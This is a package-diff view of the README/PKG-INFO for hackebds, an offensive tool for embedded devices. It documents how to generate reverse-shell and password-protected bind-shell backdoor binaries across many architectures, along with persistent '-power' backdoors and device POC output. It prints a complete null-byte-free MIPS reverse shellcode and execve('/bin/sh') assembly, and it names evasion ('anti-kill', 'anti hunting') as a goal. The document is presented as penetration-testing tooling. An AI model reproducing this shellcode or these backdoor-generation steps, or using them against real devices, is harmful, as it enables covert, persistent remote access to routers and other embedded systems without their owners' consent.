-   >>> x64el_backdoor(reverse_ip, reverse_port)
-   >>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
-   >>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
-   >>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
-   >>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
-   >>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
-   >>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
-   >>> x86_bind_shell(listen_port, passwd)
-   >>> x64_bind_shell(listen_port, passwd)
-   >>> armelv7_bind_shell(listen_port, passwd)
-   >>> aarch64_ bind_ shell(listen_port, passwd)
-   >>> mips_bind_shell(listen_port, passwd)
-   >>> mipsel_bind_shell(listen_port, passwd)
-   >>> sparc32.sparc_bind_shell(listen_port, passwd)
-   >>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
-
-（Note that the maximum password length is 4 characters for
-x86（32bits） and 8 characters for x64（64bits））
-
-.. code:: 
-
-   >>> mipsel_backdoor("127.0.0.1",5566)
-   [+] reverse_ip is: 127.0.0.1
-   [+] reverse_port is: 5566
-   [*] waiting 3s
-   [+] mipsel_backdoor is ok in current path ./
-   >>>
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png
-   :alt: 
-
-.. code:: 
-
-   >>> from hackebds import *
-   >>> x86_bind_shell(4466,"doud")
-   [+] bind port is set to 4466
-   [+] passwd is set to 'doud'
-   0x0000000064756f64
-   [*] waiting 3s
-   [+] x86_bind_shell is ok in current path ./
-   >>>
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png
-   :alt: 
-
-Then connect to the port bound to the device (password exists)
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png
-   :alt: 
-
-1. Generates the use-back shellcode (no free) null bytes corresponding
-   to various architectures
-
-.. code:: 
-
-   >>> from hackebds import *
-   >>> mipsel_reverse_sl(reverse_ip,reverse_port)
-   >>> mips_reverse_sl(reverse_ip,reverse_port)
-   >>> aarch64_reverse_sl(reverse_ip,reverse_port)
-   >>> armelv5_reverse_sl(reverse_ip,reverse_port)
-   >>> armelv7_reverse_sl(reverse_ip,reverse_port)
-   >>> armebv5_reverse_sl(reverse_ip,reverse_port)
-   >>> armebv7_backdoor(reverse_ip,reverse_port)
-   >>> mips64_reverse_sl(reverse_ip,reverse_port)
-   >>> mips64el_reverse_sl(reverse_ip,reverse_port)
-   >>> android_aarch64_backdoor(reverse_ip,reverse_port)
-   >>> x86el_reverse_sl(reverse_ip,reverse_port)
-   >>> x64el_reverse_sl(reverse_ip,reverse_port)
-   >>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
-   >>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
-   >>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
-   >>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
-
-example:
-
-.. code:: 
-
-   >>> from hackebds import *
-   >>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
-   [+] No NULL byte shellcode for hex(len is 264):
-   \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
-
-1. Added that shellcode for calling execve cannot be generated in
-   shellcraft (change context generate mips64(el), powerpc shell code
-   for execve("/bin/sh",["/bin/sh"]),0))
-
-   .. code:: 
-
-      >>> from hackebds import *
-      >>> test = ESH()
-      [*] arch is i386
-      [*] endian is little
-      [*] bits is 32
-      >>> test.sh()
-      [*] Please set correct assembly schema information(pwerpc or mips64(el))
-      >>> context.arch = 'mips64'
-      >>> test.sh()
-      "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
-      >>> test.sh()
-
-chips and architectures
------------------------
-
-Tests can leverage chips and architectures
-
-| Mips:
-| MIPS 74kc V4.12 big endian,
-| MIPS 24kc V5.0 little endian (Ralink SoC) like MediaTek MT7621
-| Ingenic Xburst V0.0 FPU V0.0 little endian
-
-| Armv7:
-| Allwinner(全志)V3s
-
-| Armv8:
-| Qualcomm Snapdragon 660
-| BCM2711
-
-Powerpc, sparc: qemu
-
-🍺enjoy hacking
----------------
-
-updating
---------
-
-2022.4.19 Added support for aarch64 null-byte reverse_shellcode
-
-2022.4.30 Reduced amount of code using functions and support python3
-
-2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and
-mipsel_reverse_sl were not enabled, added mips64_backdoor,
-mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl
-generation
-
-2022.5.21 0.0.9 version changed the generation method of armel V5
-backdoor and added the specified generation of riscv-v64 backdoor
-
-2022.6.27 0.1.0 Added Android backdoor generation
-
-2022.10.26 0.1.5 Fixed some problems and added some automatic generation
-functions of bindshell specified port passwords
-
-2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
-
-2022.11.1 Removed the generation sleep time of shellcode, and added
-mips\_ bind\_ Shell, reverse of x86 and x64 small end\_ shell\_
-Backdoor, the mips that are expected to be interrupted by mips\_ bind\_
-Shell, which solves the error of password logic processing in the
-bindshell in mips
-
-|  2022.11.2 Joined aarch64\_ bind\_ shell
-|  2022.11.2 Support command line generation backdoor and shell code,
-  characterized by light, small, efficient and fast
-
-2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some
-bug
-
-2022.12.26 0.2.9 Added the program function of generating specified
-commands, and added executable permissions after generating files
-
-2023.1.6 0.3.0 repaired cmd\_ The file generates the function bug of
-executing the specified command program, and adds the model ->arch list,
-Android bind\_ Shell file
-
-2023.1.16 0.3.1 Added bash reverse\_ Shell. At present, this tool only
-supports sh and bash. The - l function is added to list the relationship
-between device model and architecture, and the - power function is added
-to generate a more powerful reverse\_ shell\_ File, which realizes the
-continuous creation of reverse shell links without killing the program.
-Currently, the - power function only supports reverse\_ shell\_ file
-
-2023.1.29 0.3.3 -The power function adds support for bind_shell,
-bind_shell is more stable, and fixes some bugs in the execution of
-bind_shell and cmd_file files of the aarch64 architecture
-
-2023.3.7 0.3.6 Added support for the mipsn32 architecture (this
-architecture may be encountered in devices such as zyxel firewalls)
-
-Problems to be solved
----------------------
-
-Support the backend of the loongarch64 architecture and the generation
-of the bind_shell program (binutils has been integrated into the
-mainline, but cannot be installed directly through apt)
-
-Improve the generation of power_bind_shell backdoors of powerpc and
-sparc series
-
-Add anti-kill function for backdoor programs
-
-vul fix
--------
-
-CVE-2021-29921 The tool is a complete client program. This vulnerability
-will not affect the use of the tool. If you want to fix it, please run
-the tool in python 3.9 and above
-
-CVE-2022-40023 DOS_attack pip install -U mako (The vulnerability does
-not apply to this tool)
-
-CVE-2021-20270 DOS_attack pip install -U pygments (The vulnerability
-does not apply to this tool)
-
-0.2.5 Version Repair directory traversal in the specified model
-
-.. |image1| image:: https://img.shields.io/pypi/wheel/hackebds
-.. |image2| image:: https://img.shields.io/pypi/pyversions/pwntools
-.. |image3| image:: https://static.pepy.tech/badge/hackebds
-   :target: https://pepy.tech/project/hackebds
+Metadata-Version: 1.2
+Name: hackebds
+Version: 0.3.7
+Summary: This tool is used for backdoor,shellcode generation,Information retrieval and POC generation for various architecture devices
+Home-page: https://github.com/doudoudedi/hackEmbedded
+Author: doudoudedi
+Author-email: doudoudedi233@gmail.com
+License: GPL-3.0
+Description: hackebds
+        ========
+        
+        | |image1|\ |image2|
+        | |image3|
+        
+        🔗\ `中文readme <https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md>`__
+        
+        foreword
+        --------
+        
+           In the process of penetration and vulnerability mining of embedded
+           devices, many problems have been encountered. One is that some
+           devices do not have telnetd or ssh services to obtain an interactive
+           shell，Some devices are protected by firewall and cannot be connected
+           to it in the forward direction Reverse_shell is required, and the
+           other is that memory corruption vulnerabilities such as stack
+           overflow are usually Null bytes are truncated, so it is more
+           troublesome to construct reverse_shellcode, so this tool was
+           developed to exploit the vulnerability. This tool is developed based
+           on the PWN module and currently uses the python2 language，\ **Has
+           been updated to python3**
+        
+        fuction
+        -------
+        
+        This tool is embedded in the security test of the device. There are two
+        main functions:
+        
+        1. Generate **backdoor programs** (only ELF) of various architectures.
+           The backdoor program is packaged in shellless pure shellcode and is
+           smal，Pure static backdoor .\ **Armv5, Armv7, Armv8, mipsel,
+           mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32 are
+           now supported, and they are still being updated** (PS:bash support is
+           added to the reverse shell after version 0.3.1). If the backdoor of
+           the reverse shell is generated with the - power parameter, the
+           reverse shell will continue to be generated on the target machine)
+        
+        2. Generate **reverse_shell shellcode** (only linux) of various
+           architectures during the exploit process, and no null bytes, which
+           facilitates the exploitation of memory corruption vulnerabilities on
+           embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64,
+           mipsel64, powerpc, powerpc64,sparc are now supported, and they are
+           still being updated**
+        
+        3. Generate bind of various architectures bind_Shell(only ELF) file,
+           -power can persistent bind_shell
+        
+        4. Sort out the exploitable vulnerability POC or EXP of the embedded
+           device, and search and output the basic information and POC of the
+           device model in use: Function of equipment, Architecture of
+           equipment,Device CPU manufacturer,Device CPU model,WEB service
+           program of the device, and so on
+        
+        5. Support command line generation backdoor and shell code, Strong anti
+           hunting ability,characterized by light, small, efficient and fast
+        
+        install
+        -------
+        
+        Just use pip to install, if the installation fails, try to use sudo to
+        install
+        
+        .. code:: 
+        
+           Use pip install:
+           pip(3) install -U hackebds
+        
+           local install:
+           git clone https://github.com/doudoudedi/hackEmbedded
+           sudo ./start.sh
+        
+        （If you want this tool to run on a MacOS system, you need to include
+        python/bin in the bashrc environment variable）
+        
+        .. code:: 
+        
+           echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png
+           :alt: 
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png
+           :alt: 
+        
+        Instructions for use
+        ~~~~~~~~~~~~~~~~~~~~
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png
+           :alt: 
+        
+        | Please install the corresponding binutils environment before use
+        | expample:
+        
+        .. code:: 
+        
+           Ubuntu（debian）:
+             apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
+             apt install binutils-arm-linux-gnueabi/hirsute
+            MacOS:
+            	 https://github.com/Gallopsled/pwntools-binutils
+            	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
+        
+        1. Use the command line to generate the backdoor file name, shellcode,
+           bindshell, etc
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png
+              :alt: 
+        
+           .. code:: 
+        
+              hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png
+              :alt: 
+        
+           .. code:: 
+        
+              hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
+        
+           By default, the reverse shell backdoor is created using sh. If bash
+           is required (PS: here, the bash command needs to exist on the target
+           device)
+        
+           .. code:: 
+        
+              hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
+        
+           If you need to generate a backdoor and constantly create reverse
+           shells (the CPU occupied by the test is about% 8)
+        
+           .. code:: 
+        
+              hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png
+              :alt: 
+        
+           .. code:: 
+        
+              hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
+        
+           Create bind_shell to monitor the shell as sh, -power fuction can give
+           -shell bash
+        
+           .. code:: 
+        
+              hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
+        
+           The bind_shell process will not stop after being disconnected, and
+           supports repeated connections (currently this function is not
+           supported by powerpc and sparc series)
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png
+              :alt: 
+        
+           Generate cmd_file function is updated. Only need to specify the - cmd
+           parameter to generate programs for various architectures to execute
+           corresponding commands , -envp Environment variables are separated by
+           commas
+        
+           .. code:: 
+        
+              hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png
+              :alt: 
+        
+           | The list relationship between the output model and the architecture
+             is added to the function of generating the back door of the
+             specified model to facilitate the user to observe and modify. The
+             output information will be enhanced after version 0.3.5, such as
+             (60 device information, POC40+or so):
+           | Function of equipment
+           | Architecture of equipment
+           | Device CPU manufacturer
+           | Device CPU model
+           | WEB service program of the device
+           | Device default SSH service support
+           | Can monitoring be realized
+           | Device default telnet user password
+           | Device sdk support
+           | Openwrt support for devices
+           | Whether the device is vulnerable
+           | POC output
+        
+           .. code:: 
+        
+              hackebds -l
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png
+              :alt: 
+        
+           Add the retrieval of device information. Use - s to search for the -
+           model parameter. This search is fuzzy and insensitive to case. Try to
+           use the device information with the highest matching degree between
+           lowercase output and input when inputting
+        
+           If the following error occurs
+        
+           hackebds: error: argument -model: expected one argument
+        
+           Please set all parameters to lowercase or lowercase mixed with
+           uppercase. I guess it is due to the conflict between python and bash
+           in the interpretation of uppercase and lowercase letters
+        
+           .. code:: 
+        
+              hackebds -model ex200 -s
+        
+           If the following warning occurs during command output
+        
+           | /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11:
+             UserWarning: Using slow pure-python SequenceMatcher. Install
+             python-Levenshtein to remove this warning
+           |  warnings.warn('Using slow pure-python SequenceMatcher. Install
+             python-Levenshtein to remove this warning')
+        
+           If the following warning occurs during command output, you can use
+           the following command to install python-levenshtein. After
+           installation, the command retrieval speed can be increased by about 4
+           times
+        
+           .. code:: 
+        
+              pip install python-levenshtein
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png
+              :alt: 
+        
+           The POC corresponding to the generated device can use - p or -- poc,
+           which may be python scripts, commands, etc., and may need to be
+           modified by yourself
+        
+           .. code:: 
+        
+              hackebds -model ex200 -p
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png
+              :alt: 
+        
+           If a vulnerability is found in the test and you want to add the basic
+           information of a new device to this tool, you can use the - add
+           function for POC files or "/tmp/model_tree_info/" The format of the
+           directory directory of the new device under the info/directory can
+           refer to the standard generated format. After the insertion, you can
+           use the tool search and POC generation functions，Finally, if you
+           need to fill in the POC file information, you can put it in
+           "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved
+           again
+        
+           .. code:: 
+        
+              hackebds -add
+        
+           .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png
+              :alt: 
+        
+           If there are device information errors, POC errors, or you want to
+           integrate your collected device information with vulnerabilities,
+           please contact me doudoudedi233@gmail.com
+        
+        2. Generate backdoor programs of various architectures, encapsulate pure
+           shellcode, and successfully connect to the shell
+        
+        .. code:: 
+        
+           >>> from hackebds import *
+           >>> mipsel_backdoor(reverse_ip,reverse_port)
+           >>> mips_backdoor(reverse_ip,reverse_port)
+           >>> aarch64_backdoor(reverse_ip,reverse_port)
+           >>> armelv5_backdoor(reverse_ip,reverse_port)
+           >>> armelv7_backdoor(reverse_ip,reverse_port)
+           >>> armebv5_backdoor(reverse_ip,reverse_port)
+           >>> armebv7_backdoor(reverse_ip,reverse_port)
+           >>> mips64_backdoor(reverse_ip,reverse_port)
+           >>> mips64el_backdoor(reverse_ip,reverse_port)
+           >>> x86el_backdoor(reverse_ip,reverse_port)
+           >>> x64el_backdoor(reverse_ip, reverse_port)
+           >>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
+           >>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
+           >>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
+           >>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
+           >>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
+           >>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
+           >>> x86_bind_shell(listen_port, passwd)
+           >>> x64_bind_shell(listen_port, passwd)
+           >>> armelv7_bind_shell(listen_port, passwd)
+           >>> aarch64_ bind_ shell(listen_port, passwd)
+           >>> mips_bind_shell(listen_port, passwd)
+           >>> mipsel_bind_shell(listen_port, passwd)
+           >>> sparc32.sparc_bind_shell(listen_port, passwd)
+           >>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
+        
+        （Note that the maximum password length is 4 characters for
+        x86（32bits） and 8 characters for x64（64bits））
+        
+        .. code:: 
+        
+           >>> mipsel_backdoor("127.0.0.1",5566)
+           [+] reverse_ip is: 127.0.0.1
+           [+] reverse_port is: 5566
+           [*] waiting 3s
+           [+] mipsel_backdoor is ok in current path ./
+           >>>
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png
+           :alt: 
+        
+        .. code:: 
+        
+           >>> from hackebds import *
+           >>> x86_bind_shell(4466,"doud")
+           [+] bind port is set to 4466
+           [+] passwd is set to 'doud'
+           0x0000000064756f64
+           [*] waiting 3s
+           [+] x86_bind_shell is ok in current path ./
+           >>>
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png
+           :alt: 
+        
+        Then connect to the port bound to the device (password exists)
+        
+        .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png
+           :alt: 
+        
+        1. Generates the use-back shellcode (no free) null bytes corresponding
+           to various architectures
+        
+        .. code:: 
+        
+           >>> from hackebds import *
+           >>> mipsel_reverse_sl(reverse_ip,reverse_port)
+           >>> mips_reverse_sl(reverse_ip,reverse_port)
+           >>> aarch64_reverse_sl(reverse_ip,reverse_port)
+           >>> armelv5_reverse_sl(reverse_ip,reverse_port)
+           >>> armelv7_reverse_sl(reverse_ip,reverse_port)
+           >>> armebv5_reverse_sl(reverse_ip,reverse_port)
+           >>> armebv7_backdoor(reverse_ip,reverse_port)
+           >>> mips64_reverse_sl(reverse_ip,reverse_port)
+           >>> mips64el_reverse_sl(reverse_ip,reverse_port)
+           >>> android_aarch64_backdoor(reverse_ip,reverse_port)
+           >>> x86el_reverse_sl(reverse_ip,reverse_port)
+           >>> x64el_reverse_sl(reverse_ip,reverse_port)
+           >>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
+           >>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
+           >>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
+           >>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
+        
+        example:
+        
+        .. code:: 
+        
+           >>> from hackebds import *
+           >>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
+           [+] No NULL byte shellcode for hex(len is 264):
+           \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
+        
+        1. Added that shellcode for calling execve cannot be generated in
+           shellcraft (change context generate mips64(el), powerpc shell code
+           for execve("/bin/sh",["/bin/sh"]),0))
+        
+           .. code:: 
+        
+              >>> from hackebds import *
+              >>> test = ESH()
+              [*] arch is i386
+              [*] endian is little
+              [*] bits is 32
+              >>> test.sh()
+              [*] Please set correct assembly schema information(pwerpc or mips64(el))
+              >>> context.arch = 'mips64'
+              >>> test.sh()
+              "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
+              >>> test.sh()
+        
+        chips and architectures
+        -----------------------
+        
+        Tests can leverage chips and architectures
+        
+        | Mips:
+        | MIPS 74kc V4.12 big endian,
+        | MIPS 24kc V5.0 little endian (Ralink SoC) like MediaTek MT7621
+        | Ingenic Xburst V0.0 FPU V0.0 little endian
+        
+        | Armv7:
+        | Allwinner(全志)V3s
+        
+        | Armv8:
+        | Qualcomm Snapdragon 660
+        | BCM2711
+        
+        Powerpc, sparc: qemu
+        
+        🍺enjoy hacking
+        ---------------
+        
+        updating
+        --------
+        
+        2022.4.19 Added support for aarch64 null-byte reverse_shellcode
+        
+        2022.4.30 Reduced amount of code using functions and support python3
+        
+        2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and
+        mipsel_reverse_sl were not enabled, added mips64_backdoor,
+        mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl
+        generation
+        
+        2022.5.21 0.0.9 version changed the generation method of armel V5
+        backdoor and added the specified generation of riscv-v64 backdoor
+        
+        2022.6.27 0.1.0 Added Android backdoor generation
+        
+        2022.10.26 0.1.5 Fixed some problems and added some automatic generation
+        functions of bindshell specified port passwords
+        
+        2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
+        
+        2022.11.1 Removed the generation sleep time of shellcode, and added
+        mips\_ bind\_ Shell, reverse of x86 and x64 small end\_ shell\_
+        Backdoor, the mips that are expected to be interrupted by mips\_ bind\_
+        Shell, which solves the error of password logic processing in the
+        bindshell in mips
+        
+        |  2022.11.2 Joined aarch64\_ bind\_ shell
+        |  2022.11.2 Support command line generation backdoor and shell code,
+          characterized by light, small, efficient and fast
+        
+        2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some
+        bug
+        
+        2022.12.26 0.2.9 Added the program function of generating specified
+        commands, and added executable permissions after generating files
+        
+        2023.1.6 0.3.0 repaired cmd\_ The file generates the function bug of
+        executing the specified command program, and adds the model ->arch list,
+        Android bind\_ Shell file
+        
+        2023.1.16 0.3.1 Added bash reverse\_ Shell. At present, this tool only
+        supports sh and bash. The - l function is added to list the relationship
+        between device model and architecture, and the - power function is added
+        to generate a more powerful reverse\_ shell\_ File, which realizes the
+        continuous creation of reverse shell links without killing the program.
+        Currently, the - power function only supports reverse\_ shell\_ file
+        
+        2023.1.29 0.3.3 -The power function adds support for bind_shell,
+        bind_shell is more stable, and fixes some bugs in the execution of
+        bind_shell and cmd_file files of the aarch64 architecture
+        
+        2023.3.7 0.3.6 Added support for the mipsn32 architecture (this
+        architecture may be encountered in devices such as zyxel firewalls)
+        
+        Problems to be solved
+        ---------------------
+        
+        Support the backend of the loongarch64 architecture and the generation
+        of the bind_shell program (binutils has been integrated into the
+        mainline, but cannot be installed directly through apt)
+        
+        Improve the generation of power_bind_shell backdoors of powerpc and
+        sparc series
+        
+        Add anti-kill function for backdoor programs
+        
+        vul fix
+        -------
+        
+        CVE-2021-29921 The tool is a complete client program. This vulnerability
+        will not affect the use of the tool. If you want to fix it, please run
+        the tool in python 3.9 and above
+        
+        CVE-2022-40023 DOS_attack pip install -U mako (The vulnerability does
+        not apply to this tool)
+        
+        CVE-2021-20270 DOS_attack pip install -U pygments (The vulnerability
+        does not apply to this tool)
+        
+        0.2.5 Version Repair directory traversal in the specified model
+        
+        .. |image1| image:: https://img.shields.io/pypi/wheel/hackebds
+        .. |image2| image:: https://img.shields.io/pypi/pyversions/pwntools
+        .. |image3| image:: https://static.pepy.tech/badge/hackebds
+           :target: https://pepy.tech/project/hackebds
+        
+Platform: UNKNOWN
+Requires-Python: >=3
```

### Comparing `hackebds-0.3.6/setup.py` & `hackebds-0.3.7/setup.py`

 * *Files 5% similar despite different names*

```diff
